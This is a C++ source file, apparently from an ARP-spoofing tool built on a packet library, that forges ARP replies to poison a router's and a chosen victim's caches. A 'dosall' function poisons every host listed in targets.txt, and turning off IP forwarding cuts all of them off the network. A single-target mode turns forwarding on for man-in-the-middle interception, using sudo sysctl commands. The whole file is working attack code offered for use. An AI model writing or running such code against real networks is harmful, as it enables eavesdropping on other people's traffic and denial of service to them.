#include "mitm.h"
#include "../main.h"

//Data structure for configured packet
struct arpPacket{
    EthernetII toRouter;//Router designated packet
    EthernetII toVictim;//Victim designated packet
    NetworkInterface iface;//Interface
}singleTarget;

/*Creates both a router designated packet and a victim designated packet
and assigns them to the configured packet struct with the network interface*/
void createPacket(string victimIpI, string victimMacI, string routerIpI, string routerMacI){
    //Convert strings to IPv4 adresses
    IPv4Address victimIp = victimIpI;
    IPv4Address routerIp = routerIpI;
    
    //Get network interface and network interface info
    NetworkInterface iface = NetworkInterface::default_interface();
    NetworkInterface::Info info = iface.addresses();
    
    //Convert strings to proper mac address formats
    EthernetII::address_type routerMac = routerMacI;
    EthernetII::address_type victimMac = victimMacI;
    
    //Create two arp packets
    ARP routerArp(routerIp, victimIp, routerMac, info.hw_addr), victimArp(victimIp, routerIp, victimMac, info.hw_addr);
    
    //Add the arp reply to both packets
    routerArp.opcode(ARP::REPLY);
    victimArp.opcode(ARP::REPLY);
    
    //Finalize packets for sending
    EthernetII toRouter = EthernetII(routerMac, info.hw_addr) / routerArp;
    EthernetII toVictim = EthernetII(victimMac, info.hw_addr) / victimArp;
    
    //Assign values to struct
    singleTarget.toRouter = toRouter;
    singleTarget.toVictim = toVictim;
    singleTarget.iface = iface;
}

//Functions takes configured packet and a network interface then sends packets
void spoof(EthernetII toRouter, EthernetII toVictim, NetworkInterface iface){
    cout << "Poisoning...\n";
    //Declare sender
    PacketSender sender;
    
    //Loop to send packets
    while(true){
        
        //send both packets
        sender.send(toRouter, iface);
        sender.send(toVictim, iface);
        
        //sleep cooldown, if windows then sleep with a capital
        #ifdef _WIN32
            Sleep(1);
        #else
            sleep(1);
        #endif
    }
    
}

//Function used to spoof all targets in targets.txt and prevent packet forwarding
void dosall(float speed){
    //Converts file contents of targets.txt to string and splits into a vector string at index \n
    vector<string> lines = split(filetostr("targets.txt"), '\n');
    
    //Declare both macs and ips
    vector<string> macs;
    vector<string> ips;
    
    /*Loop through lines and sort odd lines(ips) from even lines(macs) and then append to proper list
     Note: (starts at 0)*/
    for(int i = 0; i < lines.size(); i++){
        if(i % 2 == 0){
            macs.push_back(lines[i]);
        }
        else{
            ips.push_back(lines[i]);
        }
    }
    
    //Get network interface and network interface info
    NetworkInterface iface = NetworkInterface::default_interface();
    NetworkInterface::Info info = iface.addresses();
    
    //Set the router ip
    IPv4Address routerIp = ips[0];
    
    //Set the router mac address
    EthernetII::address_type routerMac = macs[0];
    
    //Declare x for counting each loop
    int x = 0;
    
    //Loop to send packets
    while(true){
        
        //Declare sender
        PacketSender sender;
        
        for(int i = 1; i < ips.size(); i++){
            //Declare victim ip being reset each loop
            IPv4Address victimIp = ips[i];
            
            //Declare victim mac
            EthernetII::address_type victimMac = macs[i];
            
            //Create two arp packets
            ARP routerArp(routerIp, victimIp, routerMac, info.hw_addr), victimArp(victimIp, routerIp, victimMac, info.hw_addr);
            
            //Add reply to both packets
            routerArp.opcode(ARP::REPLY);
            victimArp.opcode(ARP::REPLY);
            
            //Finalize packets for sending
            EthernetII toRouter = EthernetII(routerMac, info.hw_addr) / routerArp;
            EthernetII toVictim = EthernetII(victimMac, info.hw_addr) / victimArp;
            
            //Send packets
            sender.send(toRouter, iface);
            sender.send(toVictim, iface);
            //sleep(0.01);
            }
        
        //Loop counter
        sleep(speed);
        x++;
        cout << "\b\b\b\b\b\b\b" << x << flush;
    }
}

//Lists possible targets from targets.txt
void findIp(bool dos){
    //Converts file contents of targets.txt to string and splits into a vector string at index \n
    vector<string> lines = split(filetostr("targets.txt"), '\n');
    
    //Declare both macs and ips lists
    vector<string> macs;
    vector<string> ips;
    
    //Declare mac and ip being used as the final choice
    string mac;
    string ip;
    
    //Declare integer for choosing target
    int choice;
    
    /*Loop through lines and sort odd lines(ips) from even lines(macs) and then append to proper list
    Note: (starts at 0)*/
    for(int i = 0; i < lines.size(); i++){
        if(i % 2 == 0){
            macs.push_back(lines[i]);
        }
        else{
            ips.push_back(lines[i]);
        }
    }
    
    //Print all possible choices of targets
    for(int i = 0; i < ips.size();i++){
        cout << i + 1 << ".\t" << macs[i] << "\t" << ips[i] << "\n";
    }

    //Take input of which target and subtract one to match arrays
    cout << "Enter target number: ";
    cin >> choice;
    choice--;
    ip = ips[choice];
    mac = macs[choice];
    
    
    //Disable packet forwarding for dos and enable for mitm
    if(dos){
        system("sudo sysctl -w net.inet.ip.forwarding=0 >/dev/null");
        cout << "Packet forwading off!\n";
    }
    else{
        system("sudo sysctl -w net.inet.ip.forwarding=1 >/dev/null");
        cout << "Packet forwarding on!\n";
    }
    
    //Sends information to createPacket function to process into configured packet
    createPacket(ip, mac, ips[0], macs[0]);
    cout << "Packet configured!\n";
    //spoofs with configured packet
    spoof(singleTarget.toRouter, singleTarget.toVictim, singleTarget.iface);
}
